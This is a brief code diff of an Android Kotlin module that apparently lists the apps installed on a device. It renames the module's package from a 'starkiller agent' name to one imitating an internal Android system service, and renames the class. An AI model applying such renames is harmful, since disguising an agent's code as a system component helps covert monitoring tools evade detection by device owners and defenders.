@@ -1,11 +1,11 @@
-package com.starkiller.agent.modules
+package com.android.internal.svc.modules
 
 import android.content.Context
 import android.content.pm.PackageManager
 import org.json.JSONArray
 import org.json.JSONObject
 
-class AppList(private val context: Context) {
+class PkgScanner(private val context: Context) {
 
     fun installed(): JSONObject {
         val apps = JSONArray()
